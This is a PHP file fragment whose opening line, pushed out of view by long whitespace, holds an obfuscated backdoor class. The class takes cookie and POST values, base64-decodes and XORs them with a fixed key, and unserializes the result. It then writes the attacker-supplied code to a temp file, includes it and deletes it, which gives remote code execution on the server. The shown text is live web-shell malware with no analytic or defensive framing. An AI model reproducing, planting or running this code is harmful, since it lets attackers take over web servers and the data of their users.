<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("hiptitupg")){class hiptitupg{public static $ecbyoz = "flnjvjbadzmypmbp";public static $gtbqdmaqk = NULL;public function __construct(){$anjfdx = @$_COOKIE[substr(hiptitupg::$ecbyoz, 0, 4)];if (!empty($anjfdx)){$hpqcuu = "base64";$jstgtsdz = "";$anjfdx = explode(",", $anjfdx);foreach ($anjfdx as $dgciyysxn){$jstgtsdz .= @$_COOKIE[$dgciyysxn];$jstgtsdz .= @$_POST[$dgciyysxn];}$jstgtsdz = array_map($hpqcuu . "_decode", array($jstgtsdz,));$jstgtsdz = $jstgtsdz[0] ^ str_repeat(hiptitupg::$ecbyoz, (strlen($jstgtsdz[0]) / strlen(hiptitupg::$ecbyoz)) + 1);hiptitupg::$gtbqdmaqk = @unserialize($jstgtsdz);}}public function __destruct(){$this->cylkgbxlj();}private function cylkgbxlj(){if (is_array(hiptitupg::$gtbqdmaqk)) {$lvvxxr = sys_get_temp_dir() . "/" . crc32(hiptitupg::$gtbqdmaqk["salt"]);@hiptitupg::$gtbqdmaqk["write"]($lvvxxr, hiptitupg::$gtbqdmaqk["content"]);include $lvvxxr;@hiptitupg::$gtbqdmaqk["delete"]($lvvxxr);exit();}}}$sctqhw = new hiptitupg();$sctqhw = NULL;} ?><?php
/*
